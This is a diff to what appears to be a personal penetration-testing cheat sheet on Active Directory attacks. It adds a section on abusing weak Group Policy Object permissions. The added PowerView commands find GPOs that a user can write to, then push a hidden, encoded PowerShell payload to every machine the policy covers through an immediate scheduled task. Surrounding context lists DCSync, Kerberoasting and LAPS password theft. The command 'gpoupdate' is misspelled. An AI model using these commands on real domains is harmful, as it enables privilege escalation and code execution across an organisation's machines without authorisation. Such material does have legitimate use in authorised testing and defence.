@@ -27,6 +27,9 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [Targeted Kerberoast](#targeted-kerberoast)
 	* [Add DCsync privilege to object](#add-dcsync-to-object)
 	* [Add Users to Group](#add-users-to-group)
+* **[Weak GPO Permission](#weak-gpo-permission)**
+	* [Enumerate weak GPO Permission](#enumerate-weak-gpo-permission)
+	* [GPO Abuse with PowerView](#gpo-abuse-with-powerview)
 * **[SQL Server Enumeration and Code Execution (PowerUpSQL)](#sql-server-enumeration-and-code-execution)**
 	* [Get SQL Instances](#get-sql-instances)
 	* [Get SQL Linked Server](#get-sql-linked-server)
@@ -243,6 +246,25 @@ Add-DomainObjectAcl -TargetIdentity "DC=contoso,DC=local" -PrincipalIdentity stu
 This will only possible if you have _AllExtendedRights_ permission on a computer object.
 ```
 Get-DomainComputer -Properties ms-mcs-admpwd
+```
+
+## Weak GPO Permission
+### Enumerate weak GPO Permission
+```
+# Domain wide
+Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs | ? {$_.activedirectoryrights -match "GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner"}}
+
+# specific user (based on user's sid)
+Get-DomainGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name | ? {$_.ActiveDirectoryRights -match "GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner" -and $_.securityidentifier -match "<userssid>"}}
+```
+
+### GPO Abuse with PowerView
+```
+# Execute specific tasks
+New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArguments '-NoP -NonI -W Hidden -Enc AAAAAAA...' -Force
+
+# update GPO (must run)
+gpoupdate /force
 ```
 
 ## SQL Server Enumeration and Code Execution
